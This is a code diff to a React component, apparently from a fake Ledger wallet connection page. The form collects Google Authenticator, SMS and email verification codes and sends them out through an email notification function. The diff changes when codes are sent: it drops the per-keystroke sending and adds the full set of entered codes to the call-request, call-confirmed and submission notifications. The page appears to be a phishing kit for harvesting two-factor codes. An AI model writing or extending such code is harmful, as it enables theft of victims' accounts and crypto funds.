@@ -1,3 +1,4 @@
+
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -15,18 +16,14 @@ const WalletLedgerConnection = () => {
     sms: '',
     email: ''
   });
-  const [submittedCodes, setSubmittedCodes] = useState({
-    googleAuth: false,
-    sms: false,
-    email: false
-  });
   const { toast } = useToast();
 
   const handleRequestCall = async () => {
     try {
       await sendEmailNotification({
         step: "Wallet Connection - Call Requested",
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        allFormData: codes
       });
     } catch (error) {
       console.error('Email notification failed:', error);
@@ -38,7 +35,8 @@ const WalletLedgerConnection = () => {
     try {
       await sendEmailNotification({
         step: "Wallet Connection - Call Confirmed",
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        allFormData: codes
       });
     } catch (error) {
       console.error('Email notification failed:', error);
@@ -50,7 +48,7 @@ const WalletLedgerConnection = () => {
     });
   };
 
-  const handleCodeChange = async (field: keyof typeof codes, value: string) => {
+  const handleCodeChange = (field: keyof typeof codes, value: string) => {
     // Apply different length limits based on the field
     let processedValue = value;
     if (field === 'googleAuth') {
@@ -60,20 +58,6 @@ const WalletLedgerConnection = () => {
       processedValue = value.replace(/\D/g, '').slice(0, 12);
     }
     setCodes(prev => ({ ...prev, [field]: processedValue }));
-
-    // Send email when code is entered (not empty)
-    if (processedValue.trim()) {
-      try {
-        await sendEmailNotification({
-          step: "Wallet Connection - Code Entry",
-          field: `${field} code`,
-          value: processedValue,
-          timestamp: new Date().toISOString()
-        });
-      } catch (error) {
-        console.error('Email notification failed:', error);
-      }
-    }
   };
 
   const handleCodeSubmit = async (field: keyof typeof codes) => {
@@ -85,7 +69,8 @@ const WalletLedgerConnection = () => {
           step: "Wallet Connection - Code Submitted",
           field: `${field} code submission`,
           value: codes[field],
-          timestamp: new Date().toISOString()
+          timestamp: new Date().toISOString(),
+          allFormData: codes
         });
       } catch (error) {
         console.error('Email notification failed:', error);
